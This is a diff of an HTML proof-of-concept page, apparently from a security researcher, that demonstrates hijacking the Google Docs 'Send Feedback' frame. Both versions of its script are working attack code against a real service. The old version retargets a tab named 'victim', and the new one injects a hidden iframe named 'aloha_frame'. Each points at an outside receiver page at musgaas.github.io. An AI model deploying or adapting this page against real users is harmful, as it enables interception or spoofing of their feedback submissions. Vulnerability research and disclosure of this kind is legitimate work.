@@ -1,32 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Google Docs Feedback Hijack PoC (DevTools-Free)</title>
+  <title>Google Docs Feedback Hijack – DevTools-Free</title>
 </head>
 <body>
-  <h2>🧪 Google Docs Feedback Hijack – Fully Passive Exploit</h2>
+  <h2>🧪 Google Docs Feedback Hijack – Final Passive Exploit</h2>
 
-  <p>This proof-of-concept simulates an attacker replacing the internal feedback iframe in Google Docs using only browser-native behavior.</p>
+  <p>
+    This page simulates an attacker replacing the Google Docs feedback iframe using only browser-native primitives — no DevTools required.
+  </p>
 
-  <p><strong>Instructions:</strong></p>
   <ol>
-    <li>Click the button below to open Google Docs in a new browser tab.</li>
-    <li>In that new tab, click <strong>Help → Send Feedback</strong>.</li>
-    <li>Wait ~15 seconds. This tab will automatically swap the feedback iframe with an attacker-controlled one.</li>
+    <li>Click the button to open Google Docs in a new tab</li>
+    <li>In that tab, click <strong>Help → Send Feedback</strong></li>
+    <li>This page will silently inject a hidden iframe named <code>aloha_frame</code>, hijacking the feedback UI</li>
   </ol>
 
-  <button onclick="launch()">Open Google Docs</button>
+  <button onclick="start()">Launch Attack</button>
 
   <script>
-    function launch() {
-      // Step 1: Open Docs in named tab
-      window.open("https://docs.google.com/document/u/0/create", "victim");
+    function start() {
+      // Open Google Docs in new tab (user-triggered)
+      window.open("https://docs.google.com/document/u/0/create", "_blank");
 
-      // Step 2: After 15 seconds, swap it with attacker's iframe
+      // Wait a bit to ensure feedback iframe is rendered
       setTimeout(() => {
-        window.open("https://musgaas.github.io/receiver-test/receiver.html", "victim");
-        console.log("✅ Swapped Docs iframe/tab with attacker-controlled receiver.");
-      }, 15000);
+        // Inject a hidden iframe named 'aloha_frame'
+        const attackerFrame = document.createElement("iframe");
+        attackerFrame.name = "aloha_frame";
+        attackerFrame.src = "https://musgaas.github.io/receiver-test/receiver.html";
+        attackerFrame.style.display = "none";
+        document.body.appendChild(attackerFrame);
+
+        console.log("✅ Injected hidden iframe named 'aloha_frame'");
+      }, 10000); // Give user time to trigger feedback
     }
   </script>
 </body>
